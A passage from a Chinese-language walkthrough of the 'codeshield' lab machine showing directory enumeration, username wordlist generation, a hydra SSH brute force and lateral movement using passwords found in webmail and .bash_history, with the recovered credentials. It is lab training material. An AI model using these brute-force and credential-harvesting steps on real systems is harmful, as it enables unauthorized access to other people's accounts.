<span class="token punctuation">[</span><span class="token number">10</span>:31:19<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /admpar/.ftppass                                  
<span class="token punctuation">[</span><span class="token number">10</span>:31:21<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /bitrix/.settings                                 
<span class="token punctuation">[</span><span class="token number">10</span>:31:21<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /bitrix/.settings.php                             
<span class="token punctuation">[</span><span class="token number">10</span>:31:21<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /bitrix/.settings.php.bak                         
<span class="token punctuation">[</span><span class="token number">10</span>:31:21<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /bitrix/.settings.bak                             
<span class="token punctuation">[</span><span class="token number">10</span>:31:23<span class="token punctuation">]</span> <span class="token number">200</span> -   19KB - /contact.html                                     
<span class="token punctuation">[</span><span class="token number">10</span>:31:23<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /css  -<span class="token operator">></span>  https://192.168.56.154/css/             
<span class="token punctuation">[</span><span class="token number">10</span>:31:25<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /ext/.deps                                        
<span class="token punctuation">[</span><span class="token number">10</span>:31:25<span class="token punctuation">]</span> <span class="token number">200</span> -   34KB - /favicon.ico                                      
<span class="token punctuation">[</span><span class="token number">10</span>:31:27<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /img  -<span class="token operator">></span>  https://192.168.56.154/img/             
<span class="token punctuation">[</span><span class="token number">10</span>:31:27<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /js/                                              
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/uploader/.flexProperties                
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/uploader/.project                       
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /lib  -<span class="token operator">></span>  https://192.168.56.154/lib/
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/varien/.actionScriptProperties
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/varien/.flexLibProperties
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/uploader/.settings
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/uploader/.actionScriptProperties
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/varien/.settings                        
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/varien/.project                         
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">200</span> -    1KB - /LICENSE.txt                                      
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">200</span> -    5KB - /iredadmin                                        
<span class="token punctuation">[</span><span class="token number">10</span>:31:29<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /mail  -<span class="token operator">></span>  https://192.168.56.154/mail/           
<span class="token punctuation">[</span><span class="token number">10</span>:31:29<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /mailer/.env                                      
<span class="token punctuation">[</span><span class="token number">10</span>:31:29<span class="token punctuation">]</span> <span class="token number">200</span> -    5KB - /mail/                                            
<span class="token punctuation">[</span><span class="token number">10</span>:31:30<span class="token punctuation">]</span> <span class="token number">502</span> -  552B  - /Microsoft-Server-ActiveSync/                     
<span class="token punctuation">[</span><span class="token number">10</span>:31:30<span class="token punctuation">]</span> <span class="token number">401</span> -  574B  - /netdata/                                         
<span class="token punctuation">[</span><span class="token number">10</span>:31:31<span class="token punctuation">]</span> <span class="token number">303</span> -    0B  - /newsletter/  -<span class="token operator">></span>  https://192.168.56.154/iredadmin/newsletter
<span class="token punctuation">[</span><span class="token number">10</span>:31:34<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /resources/.arch-internal-preview.css             
<span class="token punctuation">[</span><span class="token number">10</span>:31:34<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /resources/sass/.sass-cache/                      
<span class="token punctuation">[</span><span class="token number">10</span>:31:34<span class="token punctuation">]</span> <span class="token number">200</span> -   26B  - /robots.txt                                       
<span class="token punctuation">[</span><span class="token number">10</span>:31:36<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /status                                           
<span class="token punctuation">[</span><span class="token number">10</span>:31:36<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /status?full<span class="token operator">=</span>true                                 
<span class="token punctuation">[</span><span class="token number">10</span>:31:38<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /twitter/.env                                     
                                                                             
Task Completed                                                          </code></pre>
<p>有个mail和iredadmin都可以登录<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXVrK.png" alt="OmXVrK.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/17/OmXYQa.png" alt="OmXYQa.png" loading="lazy"><br>测试发现iredadmin是个后台登录界面,测试了一下弱口令登不上去，应该使用之前获得的用户名和密码爆破</p>
<h2 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h2><h3 id="字典生成"><a href="#字典生成" class="headerlink" title="字典生成"></a>字典生成</h3><p>先考虑在ssh爆破<br>由于用户名是姓和名一起的，用一款工具根据姓名生成字典</p>
<blockquote>
<p>工具: <a href="https://github.com/w0Tx/generate-ad-username">https://github.com/w0Tx/generate-ad-username</a></p>
</blockquote>
<p>先把姓氏中间用逗号隔开</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat user.txt </span>
Jessica,Carlson
Mohammed,Mansour
Xian,Tan
Annabella,Cocci
Thomas,Mitchel
Patrick,Early
John,Doe
Kevin,Valdez</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/generate-ad-username<span class="token punctuation">]</span>
└─<span class="token comment"># python ADGenerator.py ../user.txt >users.txt     </span>
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/generate-ad-username<span class="token punctuation">]</span>
└─<span class="token comment"># mv users.txt ../                                  </span></code></pre>
<h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>有三个端口有ssh服务分别测一下最后测出22222端口能登陆</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">                                                                                                                                                                                                                                                      
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># hydra -L users.txt -P passes.txt 192.168.56.154 ssh -s 22222</span>
Hydra v9.5 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2023</span> by van Hauser/THC <span class="token operator">&amp;</span> David Maciejak - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes <span class="token punctuation">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="token punctuation">)</span>.

Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> starting at <span class="token number">2024</span>-04-17 <span class="token number">10</span>:51:13
<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="token parameter variable">-t</span> <span class="token number">4</span>
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> max <span class="token number">16</span> tasks per <span class="token number">1</span> server, overall <span class="token number">16</span> tasks, <span class="token number">1680</span> login tries <span class="token punctuation">(</span>l:168/p:10<span class="token punctuation">)</span>, ~105 tries per task
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> attacking ssh://192.168.56.154:22222/
<span class="token punctuation">[</span>STATUS<span class="token punctuation">]</span> <span class="token number">276.00</span> tries/min, <span class="token number">276</span> tries <span class="token keyword">in</span> 00:01h, <span class="token number">1407</span> to <span class="token keyword">do</span> <span class="token keyword">in</span> 00:06h, <span class="token number">13</span> active
<span class="token punctuation">[</span>STATUS<span class="token punctuation">]</span> <span class="token number">241.33</span> tries/min, <span class="token number">724</span> tries <span class="token keyword">in</span> 00:03h, <span class="token number">961</span> to <span class="token keyword">do</span> <span class="token keyword">in</span> 00:04h, <span class="token number">11</span> active
<span class="token punctuation">[</span>STATUS<span class="token punctuation">]</span> <span class="token number">225.57</span> tries/min, <span class="token number">1579</span> tries <span class="token keyword">in</span> 00:07h, <span class="token number">106</span> to <span class="token keyword">do</span> <span class="token keyword">in</span> 00:01h, <span class="token number">11</span> active
<span class="token punctuation">[</span><span class="token number">22222</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> host: <span class="token number">192.168</span>.56.154   login: valdezk   password: Greatplace2work<span class="token operator">!</span>
<span class="token number">1</span> of <span class="token number">1</span> target successfully completed, <span class="token number">1</span> valid password found
<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Writing restore <span class="token function">file</span> because <span class="token number">8</span> final worker threads did not complete <span class="token keyword">until</span> end.
<span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token number">8</span> targets did not resolve or could not be connected
<span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token number">0</span> target did not complete
Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> finished at <span class="token number">2024</span>-04-17 <span class="token number">10</span>:58:41</code></pre>
<p>拿到一组账号密码 <code>valdezk:Greatplace2work!</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh valdezk@192.168.56.154 -p 22222</span>
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          <span class="token punctuation">(</span>@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
        @@@@@@@   @@@                       
           @@@@@@@                                                           

  _______________________________________________________________________________________________________
 <span class="token operator">|</span>  _WARNING: This system is restricted to authorized users<span class="token operator">!</span>___________________________________________  <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span>                                                                                                   <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span> IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span>                                                                                                   <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span> This system is restricted to authorized users.                                                    <span class="token operator">|</span> <span class="token operator">|</span> 
 <span class="token operator">|</span> <span class="token operator">|</span> Individuals <span class="token function">who</span> attempt unauthorized access will be prosecuted.                                   <span class="token operator">|</span> <span class="token operator">|</span> 
 <span class="token operator">|</span> <span class="token operator">|</span> If you<span class="token string">'re unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
valdezk@192.168.56.154'</span>s password: 
Welcome to Ubuntu <span class="token number">22.04</span>.3 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.15</span>.0-79-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr <span class="token number">17</span> 03:00:22 AM UTC <span class="token number">2024</span>

  System load:  <span class="token number">0.0908203125</span>       Processes:               <span class="token number">237</span>
  Usage of /:   <span class="token number">28.6</span>% of <span class="token number">47</span>.93GB   Users logged in:         <span class="token number">0</span>
  Memory usage: <span class="token number">60</span>%                IPv4 address <span class="token keyword">for</span> enp0s3: <span class="token number">192.168</span>.56.154
  Swap usage:   <span class="token number">0</span>%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar <span class="token keyword">for</span> easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance <span class="token keyword">for</span> Applications is not enabled.

<span class="token number">10</span> updates can be applied immediately.
To see these additional updates run: <span class="token function">apt</span> list <span class="token parameter variable">--upgradable</span>

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: <span class="token function">sudo</span> pro status


The list of available updates is <span class="token function">more</span> than a week old.
To check <span class="token keyword">for</span> new updates run: <span class="token function">sudo</span> <span class="token function">apt</span> update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr <span class="token number">17</span> 02:54:31 <span class="token number">2024</span> from <span class="token number">192.168</span>.56.104
valdezk@codeshield:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1007</span><span class="token punctuation">(</span>valdezk<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1007</span><span class="token punctuation">(</span>valdezk<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1007</span><span class="token punctuation">(</span>valdezk<span class="token punctuation">)</span></code></pre>
<h2 id="横向尝试"><a href="#横向尝试" class="headerlink" title="横向尝试"></a>横向尝试</h2><p>登录之后也没有user flag，尝试登录web的mail和iredadmin<br>iredadmin登录失败,不过mail可以登上去<br>邮箱根据前面pdf获得的格式构造出valdez的邮箱<code>k.valdez@codeshield.hmv</code><br>登录之后打开邮件就发现了thomas的密码<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXf3S.png" alt="OmXf3S.png" loading="lazy"><br><code>D@taWh1sperer!</code><br>根据thomas的名字以及home下面用户登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat user.txt </span>
Jessica,Carlson
Mohammed,Mansour
Xian,Tan
Annabella,Cocci
Thomas,Mitchel
Patrick,Early
John,Doe
Kevin,Valdez</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">mitchellt@codeshield:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">56</span>
drwxr-xr-x <span class="token number">14</span> root      root      <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root      root      <span class="token number">4096</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwxr-x--- <span class="token number">16</span> carlsonj  carlsonj  <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> carlsonj
drwxr-x--- <span class="token number">15</span> coccia    coccia    <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> coccia
drwxr-x---  <span class="token number">5</span> cowrie    cowrie    <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> cowrie
drwxr-x--- <span class="token number">19</span> earlyp    earlyp    <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> earlyp
drwxr-x---  <span class="token number">2</span> iredadmin iredadmin <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> iredadmin
drwxr-x---  <span class="token number">2</span> iredapd   iredapd   <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> iredapd
drwxr-x--- <span class="token number">16</span> mansourm  mansourm  <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> mansourm
drwxr-x--- <span class="token number">17</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> mitchellt
drwxr-x---  <span class="token number">2</span> netdata   netdata   <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> netdata
drwxr-x--- <span class="token number">16</span> tanx      tanx      <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> tanx
drwxr-x--- <span class="token number">18</span> valdezk   valdezk   <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> valdezk
drwxr-x---  <span class="token number">2</span> vmail     vmail     <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> vmail
mitchellt@codeshield:/home$ <span class="token function">su</span> mitchellt
Password: 
mitchellt@codeshield:/home$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1006</span><span class="token punctuation">(</span>mitchellt<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1006</span><span class="token punctuation">(</span>mitchellt<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1006</span><span class="token punctuation">(</span>mitchellt<span class="token punctuation">)</span></code></pre>
<p>也是终于拿到了user flag,但是没有sudo</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mitchellt@codeshield:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">112</span>
drwxr-x--- <span class="token number">17</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">14</span> root      root      <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-------  <span class="token number">1</span> mitchellt mitchellt  <span class="token number">209</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .bash_history
-rw-r--r--  <span class="token number">1</span> mitchellt mitchellt  <span class="token number">220</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r--  <span class="token number">1</span> mitchellt mitchellt <span class="token number">3771</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> .bashrc
drwx------ <span class="token number">11</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .cache
drwx------ <span class="token number">12</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> .config
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Desktop
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Documents
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Downloads
-rw-------  <span class="token number">1</span> mitchellt mitchellt   <span class="token number">20</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> .lesshst
drwx------  <span class="token number">3</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .local
drwxrwxr-x  <span class="token number">6</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> mining
drwx------  <span class="token number">3</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .mozilla
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Music
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Pictures
-rw-r--r--  <span class="token number">1</span> mitchellt mitchellt  <span class="token number">807</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> .profile
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Public
drwx------  <span class="token number">3</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> snap
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Templates
drwx------  <span class="token number">6</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .thunderbird
-rwxrwx---  <span class="token number">1</span> mitchellt mitchellt <span class="token number">2401</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> user.txt
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-clipboard-tty2-control.pid
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-hostversion-tty2-control.pid
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-seamless-tty2-control.pid
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Videos
mitchellt@codeshield:~$ <span class="token function">cat</span> user.txt 
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          <span class="token punctuation">(</span>@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗  
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗ 
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║ 
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║ 
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝ 
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝  
        @@@@@@@   @@@                       
           @@@@@@@                          
</code></pre>
<p>在mitchellt的历史指令中找到了用户earlyp密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mitchellt@codeshield:~$ <span class="token function">cat</span> .bash_history 
<span class="token builtin class-name">echo</span> <span class="token string">'EARL!YP7DeVel@OP'</span><span class="token operator">|</span> <span class="token function">su</span> - earlyp <span class="token parameter variable">-c</span> <span class="token string">"cp -r /home/earlyp/Development/mining ."</span>
<span class="token builtin class-name">echo</span> <span class="token string">'EARL!YP7DeVel@OP'</span><span class="token operator">|</span> <span class="token function">su</span> - earlyp <span class="token parameter variable">-c</span> <span class="token string">"cp -r /home/earlyp/Development/mining /tmp"</span>
<span class="token function">cp</span> <span class="token parameter variable">-r</span> /tmp/mining <span class="token builtin class-name">.</span>
<span class="token function">ls</span>
<span class="token builtin class-name">cd</span> mining/
<span class="token function">ls</span>
<span class="token builtin class-name">exit</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">mitchellt@codeshield:~$ <span class="token function">cat</span> .bash_history 
<span class="token builtin class-name">echo</span> <span class="token string">'EARL!YP7DeVel@OP'</span><span class="token operator">|</span> <span class="token function">su</span> - earlyp <span class="token parameter variable">-c</span> <span class="token string">"cp -r /home/earlyp/Development/mining ."</span>
<span class="token builtin class-name">echo</span> <span class="token string">'EARL!YP7DeVel@OP'</span><span class="token operator">|</span> <span class="token function">su</span> - earlyp <span class="token parameter variable">-c</span> <span class="token string">"cp -r /home/earlyp/Development/mining /tmp"</span>
<span class="token function">cp</span> <span class="token parameter variable">-r</span> /tmp/mining <span class="token builtin class-name">.</span>
<span class="token function">ls</span>
<span class="token builtin class-name">cd</span> mining/
<span class="token function">ls</span>
<span class="token builtin class-name">exit</span>
mitchellt@codeshield:~$ <span class="token function">su</span> earlyp
Password: 
earlyp@codeshield:/home/mitchellt$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>earlyp<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>earlyp<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>earlyp<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lxd<span class="token punctuation">)</span></code></pre>
<p>依然没有sudo<br>根据历史指令提示去到Development目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">earlyp@codeshield:~$ <span class="token function">cat</span> .bash_history 
<span class="token builtin class-name">cd</span> ~
<span class="token function">ls</span>
<span class="token builtin class-name">cd</span> Development/
<span class="token function">ls</span>
<span class="token builtin class-name">pwd</span>
<span class="token builtin class-name">exit</span></code></pre>
<p>然并卵，没什么有用东西</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">earlyp@codeshield:~/Development/mining$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">92</span>
drwxrwxr-x <span class="token number">6</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxrwxr-x <span class="token number">3</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">298</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> circle.yml
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">358</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> CONTRIBUTING.rst
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp   <span class="token number">46</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .coveralls.yml
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">634</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> docker-compose.yml
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">938</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Dockerfile
drwxrwxr-x <span class="token number">4</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> docs
drwxrwxr-x <span class="token number">8</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .git
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">439</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .gitignore
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">100</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .gitmodules
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp <span class="token number">1081</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> LICENSE
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">794</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Makefile
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp <span class="token number">3181</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> manage.py
